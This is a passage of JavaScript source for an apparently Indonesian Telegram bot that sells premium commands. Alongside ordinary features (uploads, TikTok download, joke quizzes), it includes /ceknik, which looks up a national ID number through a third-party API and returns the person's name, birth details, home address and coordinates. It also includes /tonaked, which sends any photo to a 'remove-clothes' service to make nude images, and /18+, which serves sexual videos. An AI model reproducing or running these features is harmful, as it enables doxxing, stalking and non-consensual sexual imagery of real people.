    form.append('reqtype', 'fileupload'); // required oleh catbox
    // append stream ke form-data dengan opsi filename & contentType
    form.append('fileToUpload', fileRes.data, {
      filename: fileName,
      contentType
    });

    // kirim ke catbox, pastikan header dari form-data dan body length diizinkan
    const { data } = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders(),
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });

    const catboxUrl = (typeof data === 'string') ? data.trim() : data;
    await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengupload file ke Catbox.\n${error.message || ''}`);
  }
});

function komentarJanda(nilai) {
  if (nilai >= 100) return "🔥 Janda premium, banyak yang ngantri.";
  if (nilai >= 90) return "💋 Bekas tapi masih segel.";
  if (nilai >= 80) return "🛵 Banyak yang ngajak balikan.";
  if (nilai >= 70) return "🌶️ Janda beranak dua, laku keras.";
  if (nilai >= 60) return "🧕 Pernah disakiti, sekarang bersinar.";
  if (nilai >= 50) return "🪞 Masih suka upload status galau.";
  if (nilai >= 40) return "🧍‍♀️ Janda low-profile.";
  if (nilai >= 30) return "💔 Ditinggal pas lagi sayang-sayangnya.";
  if (nilai >= 20) return "🫥 Baru ditinggal, masih labil.";
  if (nilai >= 10) return "🥲 Janda lokal, perlu support moral.";
  return "🚫 Masih istri orang, bro.";
}

// /cekjanda
bot.onText(/^\/cekjanda$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // 0 - 100
  const teks = `
👠 *Tes Kejandaan*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarJanda(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

function komentarMiskin(nilai) {
  if (nilai >= 100) return "💀 Miskin absolut, utang warisan.";
  if (nilai >= 90) return "🥹 Mau beli gorengan mikir 3x.";
  if (nilai >= 80) return "😩 Isi dompet: angin & harapan.";
  if (nilai >= 70) return "😭 Bayar parkir aja utang.";
  if (nilai >= 60) return "🫥 Pernah beli pulsa receh?";
  if (nilai >= 50) return "😬 Makan indomie aja dibagi dua.";
  if (nilai >= 40) return "😅 Listrik token 5 ribu doang.";
  if (nilai >= 30) return "😔 Sering nanya *gratis ga nih?*";
  if (nilai >= 20) return "🫣 Semoga dapet bansos.";
  if (nilai >= 10) return "🥲 Yang penting hidup.";
  return "😵 Gaji = 0, tagihan = tak terbatas.";
}

bot.onText(/^\/cekmiskin$/, async (msg) => {
    const chatId = msg.chat.id;
    const randomImage = getRandomImage();
    const senderId = msg.from.id;
    
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}

    const arrNilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
    const nilai = arrNilai[Math.floor(Math.random() * arrNilai.length)];

    const teks = "```\n" +
        "📉 Tes Kemiskinan\n" +
        `👤 Nama: ${escapeMarkdownV2(msg.from.first_name)}\n` +
        `📉 Nilai: ${nilai}%\n` +
        `🗣️ Komentar: ${escapeMarkdownV2(komentarMiskin(nilai))}\n` +
        "```";

    bot.sendMessage(chatId, teks, { parse_mode: "MarkdownV2" });
});

bot.onText(/\/trackip(?:@[\w_]+)?\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const ipRegex = /^(25[0-5]|2[0-4]\d|1?\d?\d)(\.(25[0-5]|2[0-4]\d|1?\d?\d)){3}$/;
  const randomImage = getRandomImage();
  const ip = match[1].trim();
               if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}
  if (!ipRegex.test(ip)) {
    return bot.sendMessage(chatId, '⚠️ Format IP tidak valid. Contoh penggunaan:\n/trackip 8.8.8.8');
  }

  try {
    // ip-api gratis, tanpa API key; fields membatasi respon agar ringkas
    const resp = await axios.get(`http://ip-api.com/json/${encodeURIComponent(ip)}`, {
      params: {
        fields: 'status,message,query,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,timezone,mobile,proxy,hosting'
      },
      timeout: 8000
    });

    const data = resp.data;
    if (!data || data.status !== 'success') {
      const msgErr = data && data.message ? data.message : 'Informasi tidak ditemukan.';
      return bot.sendMessage(chatId, `❌ Gagal mengambil data untuk IP ${ip} — ${msgErr}`);
    }

    // Susun pesan yang rapi
    const text = [
      `🔎 *𝖧𝖺𝗌𝗂𝗅 𝗉𝖾𝗅𝖺𝖼𝖺𝗄𝖺𝗇 𝖨𝖯 :* \`${data.query}\``,
      ``,
      `*𝗡𝗲𝗴𝗮𝗿𝗮 :* ${data.country ?? '-' } (${data.countryCode ?? '-'})`,
      `*𝗣𝗿𝗼𝘃𝗶𝗻𝘀𝗶 :* ${data.regionName ?? '-'}`,
      `*𝗞𝗼𝘁𝗮 :* ${data.city ?? '-'}`,
      `*𝗞𝗼𝗱𝗲 𝗣𝗼𝘀 :* ${data.zip ?? '-'}`,
      `*𝗞𝗼𝗼𝗿𝗱𝗶𝗻𝗮𝘁:* ${data.lat ?? '-'}, ${data.lon ?? '-'}`,
      `*𝗜𝗦𝗣 :* ${data.isp ?? '-'}`,
      `*𝗢𝗿𝗴𝗮𝗻𝗶𝘀𝗮𝘀𝗶:* ${data.org ?? '-'}`,
      `*𝗔𝗦 :* ${data.as ?? '-'}`,
      `*𝗭𝗼𝗻𝗮 𝗪𝗮𝗸𝘁𝘂 :* ${data.timezone ?? '-'}`,
      `*𝗠𝗼𝗯𝗶𝗹𝗲 :* ${data.mobile ? 'Ya' : 'Tidak'}`,
      `*𝗣𝗿𝗼𝘅𝘆/𝗛𝗼𝘀𝘁𝗶𝗻𝗴 :* ${data.proxy || data.hosting ? 'Mungkin (proxy/hosting)' : 'Tidak terdeteksi'}`
    ].join('\n');

    const replyOptions = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: []
      }
    };

    // Jika koordinat ada, tambahkan tombol buka di peta
    if (data.lat != null && data.lon != null) {
      const mapUrl = `https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=10/${data.lat}/${data.lon}`;
      replyOptions.reply_markup.inline_keyboard.push([
        { text: 'Buka di peta', url: mapUrl }
      ]);
    }

    await bot.sendMessage(chatId, text, replyOptions);

  } catch (err) {
    console.error('trackip error:', err && err.toString ? err.toString() : err);
    await bot.sendMessage(chatId, '⚠️ Terjadi error saat mengambil data IP. Coba beberapa saat lagi.');
  }
});

bot.onText(/\/owner (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const message = match[1]; 
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const OTAX_ID = `${OWNER_ID}`
    const firstName = msg.from.first_name;
    const lastName = msg.from.last_name || ''; 
    const username = msg.from.username || 'Tidak ada username'; 
    const senderName = `${firstName} ${lastName}`.trim(); 

    
    if (!message) {
        bot.sendMessage(chatId, 'Silakan masukkan pesan setelah /owner.');
        return;
    }

    try {
        const ownerMessage = `Pesan dari pengguna:\n` +
                             `Nama: \`${senderName}\` (@${username})\n` +
                             `ID: \`${userId}\`\n` +
                             `Chat ID: \`${chatId}\`\n` +
                             `Pesan: ${message}\n
                             𝙲𝚁𝙴𝙰𝚃𝙴 𝙱𝚈 𝚂𝚑𝚊𝚍𝚘𝚠 𝚁𝚎𝚊𝚙𝚎𝚛𝚜⸙`;

        bot.sendMessage(OTAX_ID, ownerMessage, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, 'Sabar Wahai BosKuh, Pesan Anda Telah Dikirim Ke Owner Bot\n 𝙲𝚁𝙴𝙰𝚃𝙴 𝙱𝚈 𝚂𝚑𝚊𝚍𝚘𝚠 𝚁𝚎𝚊𝚙𝚎𝚛𝚜⸙.');
    } catch (error) {
        console.error('Gagal mengirim pesan ke owner:', error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat mengirim pesan ke owner.');
    }
});
async function getUserInfo(userId) {
    try {
        const user = await bot.getChat(userId); 
        if (user) {
            const username = user.username || 'Tidak ada username';
            const firstName = user.first_name || 'Tidak ada nama depan';
            const lastName = user.last_name || 'Tidak ada nama belakang';
            const fullName = `${firstName} ${lastName}`.trim(); 

            return {
                id: userId,
                username: username,
                firstName: firstName,
                lastName: lastName,
                fullName: fullName,
            };
        } else {
            return null; 
        }
    } catch (error) {
        console.error('Gagal mendapatkan informasi pengguna:', error);
        return null; 
    }
}

bot.onText(/^\/?openn$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || !reply.document) {
    return bot.sendMessage(
      chatId,
      "Mana Filenya Dongo!!"
    );
  }

  const fileId = reply.document.file_id;
  const fileName = reply.document.file_name;

  try {
    const fileLink = await bot.getFileLink(fileId);
    const res = await fetch(fileLink);
    const content = await res.text();

    const preview =
      content.length > 3800
        ? content.substring(0, 3800) + "\n\n... (isi file terpotong)"
        : content;

    const text = `╭─⭓ *Isi File* ────
│ 📁 *${fileName}*
╰───────────────⭓

\\\TypeScript
${preview}
\\\
`;

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
  }
});

// /ceknik command
bot.onText(/^\/ceknik(?:\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}

  const input = match[1] ? match[1].trim().replace(/\D/g, '') : '';

  if (!input) {
    return bot.sendMessage(chatId,
      `<blockquote><b>📝 CEK NIK - DATA KEPENDUDUKAN</b>\n\n<b>Format Penggunaan:</b>\n<code>/ceknik [nomor_nik]</code>\n\n<b>📌 Contoh:</b>\n<code>/ceknik 3372034509870001</code>\n\n<b>⚠️ Catatan:</b>\n• NIK harus 16 digit angka\n• Data bersumber dari API resmi\n• Proses membutuhkan waktu 10-20 detik</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (input.length !== 16) {
    return bot.sendMessage(chatId,
      `<blockquote><b>❌ FORMAT NIK SALAH</b>\n\nNIK harus terdiri dari <b>16 digit angka</b>\nNIK yang Anda masukkan: <b>${input.length} digit</b>\n\n<b>📌 Contoh yang benar:</b>\n<code>3372034509870001</code></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const processingMsg = await bot.sendMessage(chatId,
    `<blockquote><b>🔍 MENCARI DATA KEPENDUDUKAN...</b>\n\n<b>📄 NIK:</b> <code>${input}</code>\n<b>⏳ Status:</b> Menghubungi server...</blockquote>`,
    { parse_mode: "HTML" }
  );

  try {
    await bot.editMessageText(
      `<blockquote><b>🔍 MENCARI DATA KEPENDUDUKAN...</b>\n\n<b>📄 NIK:</b> <code>${input}</code>\n<b>⏳ Status:</b> Memproses data kependudukan...</blockquote>`,
      {
        chat_id: chatId,
        message_id: processingMsg.message_id,
        parse_mode: "HTML"
      }
    );

    const res = await axios.get(
      `https://api.siputzx.my.id/api/tools/nik-checker?nik=${input}`,
      { timeout: 30000 }
    );

    const body = res.data;
    
    if (!body || !body.data) {
      return bot.editMessageText(
        `<blockquote><b>❌ DATA TIDAK DITEMUKAN</b>\n\nData untuk NIK <code>${input}</code> tidak ditemukan dalam database.\n\n<b>⚠️ Kemungkinan penyebab:</b>\n• NIK tidak terdaftar\n• Data belum terupdate\n• Server sementara tidak bisa diakses</blockquote>`,
        {
          chat_id: chatId,
          message_id: processingMsg.message_id,
          parse_mode: "HTML"
        }
      );
    }

    const d = body.data.data;
    const meta = body.data.metadata;

    const resultText = 
      `<blockquote><b>✅ DATA KEPENDUDUKAN DITEMUKAN</b>\n\n<b>📄 NOMOR NIK:</b>\n<code>${body.data.nik || input}</code>\n\n<b>👤 DATA PRIBADI</b>\n<b>├ Nama:</b> ${d.nama || '❌ Tidak tercantum'}\n<b>├ Jenis Kelamin:</b> ${d.kelamin || '❌ Tidak tercantum'}\n<b>├ Tempat Lahir:</b> ${d.tempat_lahir || '❌ Tidak tercantum'}\n<b>├ Tanggal Lahir:</b> ${d.tanggal_lahir || '❌ Tidak tercantum'}\n<b>├ Usia:</b> ${d.usia || '❌ Tidak tercantum'}\n<b>├ Zodiak:</b> ${d.zodiak || '❌ Tidak tercantum'}\n<b>└ Pasaran:</b> ${d.pasaran || '❌ Tidak tercantum'}\n\n<b>🏠 ALAMAT DOMISILI</b>\n<b>├ Provinsi:</b> ${d.provinsi || '❌ Tidak tercantum'}\n<b>├ Kabupaten:</b> ${d.kabupaten || '❌ Tidak tercantum'}\n<b>├ Kecamatan:</b> ${d.kecamatan || '❌ Tidak tercantum'}\n<b>├ Kelurahan:</b> ${d.kelurahan || '❌ Tidak tercantum'}\n<b>├ Alamat:</b> ${d.alamat || '❌ Tidak tercantum'}\n<b>├ TPS:</b> ${d.tps || '❌ Tidak tercantum'}\n<b>└ Koordinat:</b> ${d.koordinat ? `${d.koordinat.lat}, ${d.koordinat.lon}` : '❌ Tidak tercantum'}\n\n<b>📊 INFORMASI TAMBAHAN</b>\n<b>├ Ultah Mendatang:</b> ${d.ultah_mendatang || '❌ Tidak tercantum'}\n<b>├ Jumlah LHP:</b> ${d.jumlah_lhp || 0}\n<b>├ Metode Pencarian:</b> ${meta ? meta.metode_pencarian : '❌ Tidak tercantum'}\n<b>└ Timestamp:</b> ${body.timestamp || (meta && meta.timestamp) || '❌ Tidak tercantum'}\n\n<b>⚠️ PERINGATAN PRIVASI</b>\nData ini bersifat rahasia. Gunakan dengan bijak!\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n<i>🕐 ${new Date().toLocaleString('id-ID')}</i></blockquote>`;

    await bot.deleteMessage(chatId, processingMsg.message_id);
    await bot.sendMessage(chatId, resultText, { parse_mode: "HTML" });

  } catch (error) {
    console.error('Error in ceknik:', error);
    
    let errorMessage = '';
    if (error.code === 'ECONNABORTED') {
      errorMessage = '⏰ Timeout: Server tidak merespons dalam waktu 30 detik.';
    } else if (error.response) {
      errorMessage = '🔴 Error Server: API tidak dapat diakses sementara.';
    } else if (error.request) {
      errorMessage = '🌐 Koneksi Error: Tidak dapat terhubung ke server.';
    } else {
      errorMessage = '❌ Terjadi kesalahan sistem.';
    }

    await bot.editMessageText(
      `<blockquote><b>❌ GAGAL MENGAMBIL DATA</b>\n\n${errorMessage}\n\n<b>📄 NIK:</b> <code>${input}</code>\n<b>🔄 Solusi:</b> Coba lagi beberapa menit kemudian.</blockquote>`,
      {
        chat_id: chatId,
        message_id: processingMsg.message_id,
        parse_mode: "HTML"
      }
    );
  }
});

async function tiktok(url) {
  try {
    const encodedParams = new URLSearchParams();
    encodedParams.set("url", url);
    encodedParams.set("hd", "1");

    const response = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "current_language=en",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      },
    });

    if (!response.data || !response.data.data) {
      throw new Error("Gagal mendapatkan data TikTok");
    }

    const videos = response.data.data;
    return {
      title: videos.title,
      cover: videos.cover,
      origin_cover: videos.origin_cover,
      no_watermark: videos.play,
      watermark: videos.wmplay,
      music: videos.music,
    };
  } catch (error) {
    throw error;
  }
}


bot.onText(/^\/tiktok(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const url = match[1];
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}

  
  if (!url) {
    return bot.sendMessage(chatId, `<blockquote>☘️ Link TikTok-nya Mana?</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

 
  const urlRegex = /^(https?:\/\/)?([\w.-]+)+(:\d+)?(\/\S*)?$/;
  if (!urlRegex.test(url)) {
    return bot.sendMessage(chatId, `<blockquote>⚠️ Itu Bukan Link Yang Benar</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

  bot.sendMessage(chatId, `<blockquote>⏳ Tunggu sebentar, sedang mengambil video...</blockquote>`, {
        parse_mode: "HTML"
        });

  try {
  const res = await tiktok(url);

 
  let caption = `🎬 Judul: ${res.title}`;
     if (caption.length > 1020) {
     caption = caption.substring(0, 1017) + "...";
  }

await bot.sendVideo(chatId, res.no_watermark, { caption });
 
  if (res.music && res.music.trim() !== "") {
    await bot.sendAudio(chatId, res.music, { title: "tiktok_audio.mp3" });
  } else {
    await bot.sendMessage(chatId, `<blockquote>🎵 Video ini tidak memiliki audio asli.</blockquote>`, {
        parse_mode: "HTML"
        });
  }

} catch (error) {
  console.error(error);
  bot.sendMessage(chatId, `<blockquote>⚠️ Terjadi kesalahan saat mengambil video TikTok. Coba lagi nanti.</blockquote>`, {
        parse_mode: "HTML"
        });
}
});

bot.onText(/^\/tonaked(?:\s+([\s\S]+))?/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const randomImage = getRandomImage()
  const pengirim = msg.from
  const urlArg = match[1]?.trim()

  let imageUrl = urlArg || null

  if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id
    const fileLink = await bot.getFileLink(fileId)
    imageUrl = fileLink
  } 

  if (!imageUrl) {
    return bot.sendMessage(chatId, "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tonaked")
  }

  const status = await bot.sendMessage(chatId, "⌭ Memproses gambar...")

  try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Mifdalul" }]
      ]
    }
  });
}


    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`, { 
      method: "GET", 
      headers: { accept: "*/*" } 
    })
    const data = await res.json()
    const hasil = data.result || null

    if (!hasil) {
      return bot.editMessageText("⎈ Gagal memproses gambar. Pastikan URL atau foto valid.", {
        chat_id: chatId,
        message_id: status.message_id
      })
    }

    await bot.deleteMessage(chatId, status.message_id)

  await bot.sendPhoto(chatId, hasil, {
  caption: 
`\`\`\`
⎙ Selesai
━━━━━━━━━━━━━
━━━【 HUNTER TOOSL】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs
\`\`\``,
  parse_mode: "Markdown"
}) 
} catch (e) {
    await bot.editMessageText("⎈ Terjadi kesalahan saat memproses gambar.", {
      chat_id: chatId,
      message_id: status.message_id
    })
  }
})

bot.onText(/^\/18\+$/, async (msg) => {
  const chatId = msg.chat.id;
  const randomImage = getRandomImage();
  function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}
  const senderId = msg.from.id;
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}

  // Kirim reaksi waktu (simulasi)
  await bot.sendMessage(chatId, "⏱️ Tunggu sebentar ya sayang... 😘");

  try {
    // Baca file JSON (pastikan path benar)
    const raw = fs.readFileSync("./lib/anuu.json", "utf8");
    const json = JSON.parse(raw);

    if (!json.videos || !Array.isArray(json.videos) || json.videos.length === 0) {
      return bot.sendMessage(chatId, "🚫 Gagal ambil video, file JSON kosong atau rusak.");
    }

    // Caption random
    const captions = [
      "Asupan hari ini sayangg🥵💦",
      "mana tahan🥵",
      "pulen bgtt🥵💦",
      "enak banget🥰",
      "andai aku disitu😋",
      "tete padet😳",
      "jadi sagne💦",
    ];
    const caption = pickRandom(captions);

    // Pilih video acak
    const hasil = pickRandom(json.videos);

    // Kirim video
    await bot.sendVideo(chatId, hasil, {
      caption: caption,
      parse_mode: "Markdown",
    });

    // Kirim ulang caption agar lebih “hidup”
    await bot.sendMessage(chatId, caption);
  } catch (err) {
    console.error("❌ Error kirim video:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat ambil video.");
  }
});

bot.onText(/\/encjava/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();
    const randomImage = getRandomImage();
    
    // Cek Premium User
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur ini
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}

   
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "🙈 *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "🙈 *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `Hunters-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        // Cek apakah file valid sebelum dienkripsi
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        // Proses enkripsi menggunakan Aphocalyps Chaos Core
        const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        // Cek apakah hasil enkripsi valid
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "🔥 *File terenkripsi (Zoro Infinity) siap!*\n_©Zoro ENC_",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "Zoro Encrypt Selesai");

        // Hapus file setelah dikirim
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `🙈 *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

        // Hapus file jika ada error
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});

bot.onText(/\/hd(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputText = match[1];
  let fileUrl;

  try {
    // Jika membalas foto
    if (msg.reply_to_message?.photo) {
      const file = msg.reply_to_message.photo.slice(-1)[0];
      const fileLink = await bot.getFileLink(file.file_id);
      fileUrl = fileLink;
    } else if (inputText && inputText.startsWith('http')) {
      fileUrl = inputText;
    } else {
      return bot.sendMessage(chatId, '❌ Kirim perintah dengan membalas foto atau menyertakan URL gambar.\nContoh: `/remini https://example.com/image.jpg`', { parse_mode: 'Markdown' });
    }

    await bot.sendMessage(chatId, '⏳ Memproses gambar...');

    const response = await axios.get(`https://fastapi.acodes.my.id/api/generator/remini?url=${encodeURIComponent(fileUrl)}`, {
      responseType: 'arraybuffer'
    });

    await bot.sendPhoto(chatId, { source: Buffer.from(response.data) }, {
      caption: '✅ Gambar berhasil ditingkatkan kualitasnya!'
    });

  } catch (err) {
    console.error('MengHD Kan Error:', err.message);
    bot.sendMessage(chatId, '❌ Gagal memproses gambar.');
  }
});
// command sticker
bot.onText(/\/sticker/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📸 Kirimkan foto atau gambar yang ingin dijadikan stiker!");

  bot.once('photo', async (photoMsg) => {
    try {
      const fileId = photoMsg.photo[photoMsg.photo.length - 1].file_id;
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const filePath = `sticker_${chatId}.jpg`;

      fs.writeFileSync(filePath, response.data);
      await bot.sendSticker(chatId, filePath);
      fs.unlinkSync(filePath);
    } catch (err) {
      await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat stiker.");
    }
  });
});

bot.onText(/^\/(open|close)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  const statusData = {};

  if (statusData[msg.chat.id.toString()] === 'off') return;
  
  // Cek apakah di grup
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya bisa di grup Telegram!');
  }

  // Cek apakah pengirim admin
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isAdmin = admins.some(admin => admin.user.id === userId);
    if (!isAdmin) return bot.sendMessage(chatId, '❌ Lu bukan admin bang!');

    if (command === 'close') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: false
      });
      return bot.sendMessage(chatId, '🔒 Grup telah *dikunci*! Hanya admin yang bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

    if (command === 'open') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      });
      return bot.sendMessage(chatId, '🔓 Grup telah *dibuka*! Semua member bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

  } catch (err) {
    console.error('Gagal atur izin:', err);
    return bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengatur grup.');
  }
});

bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;

  if (!input) {
    return bot.sendMessage(chatId,
      "❌ Format salah.\n\nContoh:\n`/iqc Fianz | 00:00 | 80 | TELKOMSEL`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "INDOSAT OOREDOO";

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await bot.sendPhoto(chatId, buffer, {
